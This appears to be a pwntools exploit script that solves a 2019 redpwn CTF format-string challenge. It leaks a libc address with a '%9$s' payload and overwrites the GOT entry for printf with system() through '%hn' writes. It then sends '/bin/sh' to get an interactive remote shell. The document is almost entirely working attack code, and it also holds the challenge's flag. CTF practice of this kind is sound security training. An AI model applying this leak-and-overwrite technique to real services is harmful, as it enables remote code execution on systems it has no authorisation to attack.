#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chall.2019.redpwn.net --port 4007
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chall.2019.redpwn.net'
port = int(args.PORT or 4007)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
io = start()

def leak(addr):
    payload = 'AAAA%9$s'  + p32(addr)
    io.sendline(payload)

    s=io.recvuntil('AAAA')
    s=io.recv(4)
    s=unpack(s)

    print hex(addr), hex(s)
    return s

s = leak(0x804a010)
libc.address = s - libc.symbols['printf']
log.info(hex(libc.address))
log.info(hex(libc.symbols['system']))

b1 = libc.symbols['system'] & 0xffff
b2 = (libc.symbols['system'] >> 16) & 0xffff
log.info(hex(b1))
log.info(hex(b2))


# b1 - 5 digits
# b2 - 5 digits

def rnd_write(addr):
    payload = 'AAAAAA%{}x%15$hn%{}x%16$hn'.format(b1 - 6, b2 - b1) + p32(addr) + p32(addr + 2)
    print (payload)
    io.sendline(payload)
    io.recvuntil('AAAAAA')

addr = 0x804a010
leak(addr)
rnd_write(addr)
leak(addr)

io.sendline('/bin/sh\x00')
io.interactive()
io.close()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
#flag{__xXxxXx__w3lc0me_t0_th3_surf4c3__xXxxXx__}
io.interactive()

